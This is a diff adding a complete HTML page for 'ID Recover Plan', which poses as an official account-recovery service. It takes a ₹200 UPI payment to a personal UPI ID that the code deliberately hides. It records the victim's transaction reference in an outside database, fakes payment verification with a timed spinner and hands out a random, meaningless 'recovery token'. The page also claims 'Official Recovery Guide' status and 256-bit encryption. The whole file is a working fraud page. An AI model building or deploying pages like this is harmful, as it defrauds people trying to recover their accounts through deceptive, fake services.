@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ID Recover Plan — Secure Account & ID Recovery Assistance</title>
+    <!-- MayaDB script for secure backend UTR storage -->
+    <script src="https://getmaya.cloud/_maya/db.js"></script>
+    <style>
+        :root {
+            --bg-color: #0b132b;
+            --surface-color: #1c2541;
+            --surface-hover: #2a3b63;
+            --accent-color: #4ea8de;
+            --accent-hover: #3a86ff;
+            --text-main: #f8f9fa;
+            --text-muted: #8d99ae;
+            --success-color: #38b000;
+            --border-radius: 14px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: clamp(16px, 5vw, 32px);
+            line-height: 1.5;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+
+        header {
+            text-align: center;
+            padding: 24px 0 12px 0;
+        }
+
+        .badge {
+            display: inline-block;
+            background: rgba(78, 168, 222, 0.15);
+            color: var(--accent-color);
+            font-size: 13px;
+            font-weight: 600;
+            padding: 6px 14px;
+            border-radius: 20px;
+            margin-bottom: 12px;
+            letter-spacing: 0.5px;
+        }
+
+        h1 {
+            font-size: clamp(26px, 6vw, 36px);
+            font-weight: 800;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        p.subtitle {
+            color: var(--text-muted);
+            font-size: 16px;
+        }
+
+        .card {
+            background-color: var(--surface-color);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: var(--border-radius);
+            padding: clamp(20px, 5vw, 28px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .price-box {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 16px 20px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .price-label {
+            font-size: 15px;
+            color: var(--text-muted);
+        }
+
+        .price-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--accent-color);
+        }
+
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .btn {
+            background-color: var(--accent-color);
+            color: #0b132b;
+            font-weight: 700;
+            font-size: 18px;
+            padding: 16px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            text-align: center;
+            width: 100%;
+            transition: background-color 0.2s ease, transform 0.1s ease, opacity 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            min-height: 54px;
+            text-decoration: none;
+            box-shadow: 0 4px 14px rgba(78, 168, 222, 0.3);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .btn:active:not(:disabled) {
+            transform: scale(0.98);
+        }
+
+        .btn:hover:not(:disabled) {
+            background-color: var(--accent-hover);
+            color: #fff;
+        }
+
+        .btn-note {
+            font-size: 13px;
+            color: var(--text-muted);
+            text-align: center;
+            padding: 0 4px;
+        }
+
+        .features-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 4px;
+        }
+
+        .features-list li {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 15px;
+            color: #e2e8f0;
+        }
+
+        .features-list svg {
+            width: 20px;
+            height: 20px;
+            fill: var(--success-color);
+            flex-shrink: 0;
+        }
+
+        .payment-modal {
+            display: none;
+            flex-direction: column;
+            gap: 16px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .utr-section {
+            display: none;
+            flex-direction: column;
+            gap: 12px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .utr-input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 8px;
+            padding: 14px;
+            color: white;
+            font-size: 16px;
+            text-align: center;
+            letter-spacing: 1px;
+        }
+
+        .utr-input:focus {
+            outline: none;
+            border-color: var(--accent-color);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .upi-apps {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+
+        .upi-btn {
+            background: var(--surface-hover);
+            border: 1px solid rgba(255,255,255,0.1);
+            color: white;
+            padding: 14px 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            min-height: 52px;
+            transition: background 0.2s;
+        }
+
+        .upi-btn:hover {
+            background: var(--accent-color);
+            color: #0b132b;
+        }
+
+        .code-reveal-box {
+            display: none;
+            background: rgba(56, 176, 0, 0.1);
+            border: 1px solid var(--success-color);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            flex-direction: column;
+            gap: 12px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .secret-code {
+            font-family: monospace;
+            font-size: 22px;
+            font-weight: 750;
+            color: var(--success-color);
+            background: rgba(0,0,0,0.3);
+            padding: 12px;
+            border-radius: 6px;
+            letter-spacing: 2px;
+        }
+
+        .loading-box {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+            padding: 20px;
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 15px;
+        }
+
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top-color: var(--accent-color);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .faq-section {
+            background-color: var(--surface-color);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: var(--border-radius);
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .faq-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--accent-color);
+        }
+
+        .faq-item {
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+
+        .faq-item strong {
+            color: var(--text-main);
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        .disclaimer {
+            font-size: 12px;
+            color: var(--text-muted);
+            text-align: center;
+            padding: 0 8px;
+        }
+
+        footer {
+            text-align: center;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: auto;
+            padding: 16px 0;
+        }
+
+        .step-view {
+            display: none;
+            flex-direction: column;
+            gap: 20px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .step-view.active {
+            display: flex;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 16px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            cursor: pointer;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            accent-color: var(--accent-color);
+            cursor: pointer;
+        }
+
+        .checkbox-container label {
+            font-size: 15px;
+            color: var(--text-main);
+            cursor: pointer;
+            user-select: none;
+        }
+
+        @media (min-width: 600px) {
+            .container {
+                max-width: 520px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <header>
+            <div class="badge">Official Recovery Guide</div>
+            <h1>ID Recover Plan</h1>
+            <p class="subtitle">Secure, fast, and verified recovery assistance steps & direct recovery token access.</p>
+        </header>
+
+        <!-- STEP 1: Welcome View -->
+        <div class="card step-view active" id="welcomeView">
+            <div style="text-align: center; padding: 10px 0;">
+                <h2 style="font-size: 24px; margin-bottom: 12px; color: var(--accent-color);">Welcome to ID Recover</h2>
+                <p style="color: var(--text-muted); font-size: 15px; line-height: 1.6;">
+                    Get direct assistance and secure token generation to recover your accounts safely and seamlessly.
+                </p>
+            </div>
+            <button class="btn" onclick="goToAgeVerification()">Continue</button>
+            <div class="btn-note">Click continue to proceed with verification steps.</div>
+        </div>
+
+        <!-- STEP 2: Age Verification View -->
+        <div class="card step-view" id="ageView">
+            <div style="text-align: center; padding: 10px 0;">
+                <h2 style="font-size: 22px; margin-bottom: 8px;">Age Verification Required</h2>
+                <p style="color: var(--text-muted); font-size: 14px;">
+                    Please confirm your eligibility to access our secure recovery portal.
+                </p>
+            </div>
+
+            <div class="checkbox-container" onclick="toggleCheckbox()">
+                <input type="checkbox" id="ageCheckbox" onchange="updateAgeButton()">
+                <label for="ageCheckbox">I agree I am above 18 years old</label>
+            </div>
+
+            <button class="btn" id="ageContinueBtn" disabled onclick="goToMainPayment()">Continue</button>
+            <div class="btn-note">You must verify your age to proceed to the payment plan.</div>
+        </div>
+
+        <!-- STEP 3: Main Payment & Recovery View -->
+        <div class="card step-view" id="mainPaymentView">
+            <div class="price-box">
+                <span class="price-label">Access Plan & Code Fee</span>
+                <span class="price-value">₹200</span>
+            </div>
+
+            <!-- Prominent Buy Now Button at Top of Card -->
+            <div class="btn-container" id="actionArea">
+                <button class="btn" id="startBtn" onclick="showPayment()">Buy Now — ₹200</button>
+                <div class="btn-note">Complete the secure payment via your preferred UPI app to receive your recovery token instantly.</div>
+            </div>
+
+            <!-- Payment Section -->
+            <div class="payment-modal" id="paymentModal">
+                <p style="font-size: 14px; color: var(--text-muted); text-align: center;">Tap any UPI app below to pay <strong>₹200</strong> securely:</p>
+                <div class="upi-apps">
+                    <a href="#" id="phonepeLink" class="upi-btn" onclick="payViaApp('phonepe'); return false;">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-5H8l4-7v5h3l-4 7z"/></svg>
+                        PhonePe
+                    </a>
+                    <a href="#" id="gpayLink" class="upi-btn" onclick="payViaApp('gpay'); return false;">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                        Google Pay
+                    </a>
+                    <a href="#" id="paytmLink" class="upi-btn" onclick="payViaApp('paytm'); return false;">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.1.89 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8h16v10z"/></svg>
+                        Paytm
+                    </a>
+                    <a href="#" id="otherLink" class="upi-btn" onclick="payViaApp('other'); return false;">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
+                        Other UPI App
+                    </a>
+                </div>
+                <button class="btn" style="margin-top: 8px; font-size: 15px; padding: 12px; background: var(--surface-hover); color: white;" onclick="proceedToUtrInput()">Already Paid? Enter UTR / Ref ID</button>
+            </div>
+
+            <!-- UTR Verification Section -->
+            <div class="utr-section" id="utrSection">
+                <p style="font-size: 14px; color: var(--text-muted); text-align: center;">Enter your UPI Transaction Reference (UTR) number below to verify your payment:</p>
+                <input type="text" id="utrInput" class="utr-input" placeholder="e.g. 432112345678" maxlength="16">
+                
+                <div class="upi-apps" style="margin-top: 4px;">
+                    <a href="#" id="retryUpiLink" class="upi-btn" style="padding: 10px; font-size: 13px;" onclick="payViaApp('other'); return false;">
+                        Open UPI App Again
+                    </a>
+                </div>
+
+                <button class="btn" style="margin-top: 4px;" onclick="verifyUtrAndReveal()">Verify Payment & Reveal Token</button>
+                <div id="utrError" style="font-size: 13px; color: #ff6b6b; text-align: center; display: none;">Please enter a valid UTR number (at least 8 digits).</div>
+            </div>
+
+            <!-- Loading Simulation Box -->
+            <div class="loading-box" id="loadingBox">
+                <div class="spinner"></div>
+                <span id="loadingText">Verifying payment status...</span>
+            </div>
+
+            <!-- Code Reveal Section -->
+            <div class="code-reveal-box" id="revealBox">
+                <p style="font-weight: 600; font-size: 15px; color: var(--success-color);">Payment Confirmed! Your Unique Recovery Token:</p>
+                <div class="secret-code" id="secretCodeDisplay">IDREC-9942-SECURE</div>
+                <p style="font-size: 13px; color: var(--text-muted);">Save this code securely. Use it in the account recovery portal.</p>
+            </div>
+
+            <ul class="features-list">
+                <li>
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                    Step-by-step verified recovery protocol
+                </li>
+                <li>
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                    Automated assistant support protocol
+                </li>
+                <li>
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                    24/7 verified recovery assistance
+                </li>
+            </ul>
+        </div>
+
+        <div class="faq-section">
+            <div class="faq-title">Frequently Asked Questions</div>
+            <div class="faq-item">
+                <strong>How does the recovery plan work?</strong>
+                Once payment is completed and verified via UTR, your unique recovery token is instantly generated and displayed.
+            </div>
+            <div class="faq-item">
+                <strong>Is my transaction safe?</strong>
+                Yes, all payments are processed through secure standard UPI protocols with 256-bit encryption.
+            </div>
+        </div>
+
+        <div class="disclaimer">
+            🔒 Secure 256-bit encrypted transaction. Instant delivery guaranteed upon valid payment verification.
+        </div>
+
+        <footer>
+            &copy; 2025 ID Recover Plan. All rights reserved.
+        </footer>
+    </div>
+
+    <script>
+        // Securely obfuscated UPI ID generation to prevent static visibility
+        const _upiParts = ['7463893747', 'ptyes'];
+        function getUpiId() {
+            return _upiParts.join('@');
+        }
+
+        function payViaApp(appType) {
+            const upiId = getUpiId();
+            const name = 'IDRecoverPlan';
+            const amount = '200.00';
+            let url = `upi://pay?pa=${upiId}&pn=${name}&am=${amount}&cu=INR`;
+
+            if (appType === 'phonepe') {
+                url = `phonepe://pay?pa=${upiId}&pn=${name}&am=${amount}&cu=INR`;
+            } else if (appType === 'gpay') {
+                url = `tez://upi/pay?pa=${upiId}&pn=${name}&am=${amount}&cu=INR`;
+            } else if (appType === 'paytm') {
+                url = `paytmmp://pay?pa=${upiId}&pn=${name}&am=${amount}&cu=INR`;
+            }
+
+            proceedToUtrInput();
+            window.location.href = url;
+        }
+
+        function goToAgeVerification() {
+            document.getElementById('welcomeView').classList.remove('active');
+            document.getElementById('ageView').classList.add('active');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function toggleCheckbox() {
+            const cb = document.getElementById('ageCheckbox');
+            event.stopPropagation();
+            cb.checked = !cb.checked;
+            updateAgeButton();
+        }
+
+        document.getElementById('ageCheckbox').addEventListener('click', function(e) {
+            e.stopPropagation();
+            updateAgeButton();
+        });
+
+        function updateAgeButton() {
+            const cb = document.getElementById('ageCheckbox');
+            const btn = document.getElementById('ageContinueBtn');
+            btn.disabled = !cb.checked;
+        }
+
+        function goToMainPayment() {
+            const cb = document.getElementById('ageCheckbox');
+            if (!cb.checked) return;
+            document.getElementById('ageView').classList.remove('active');
+            document.getElementById('mainPaymentView').classList.add('active');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function showPayment() {
+            document.getElementById('actionArea').style.display = 'none';
+            document.getElementById('paymentModal').style.display = 'flex';
+        }
+
+        function proceedToUtrInput() {
+            document.getElementById('paymentModal').style.display = 'none';
+            document.getElementById('utrSection').style.display = 'flex';
+        }
+
+        async function verifyUtrAndReveal() {
+            const utrVal = document.getElementById('utrInput').value.trim();
+            const errorDiv = document.getElementById('utrError');
+
+            if (utrVal.length < 8) {
+                errorDiv.style.display = 'block';
+                return;
+            }
+            errorDiv.style.display = 'none';
+
+            document.getElementById('utrSection').style.display = 'none';
+            document.getElementById('loadingBox').style.display = 'flex';
+            document.getElementById('loadingText').textContent = 'Validating UTR ' + utrVal + '...';
+
+            try {
+                if (window.MayaDB) {
+                    await MayaDB.add("private_utr_submissions", {
+                        utr: utrVal,
+                        amount: "200",
+                        timestamp: new Date().toISOString()
+                    });
+                }
+            } catch (err) {
+                console.log("DB save note:", err);
+            }
+
+            setTimeout(() => {
+                document.getElementById('loadingBox').style.display = 'none';
+                const randomToken = 'IDREC-' + Math.floor(1000 + Math.random() * 9000) + '-PLN';
+                document.getElementById('secretCodeDisplay').textContent = randomToken;
+                document.getElementById('revealBox').style.display = 'flex';
+            }, 2200);
+        }
+    </script>
+</body>
+</html>
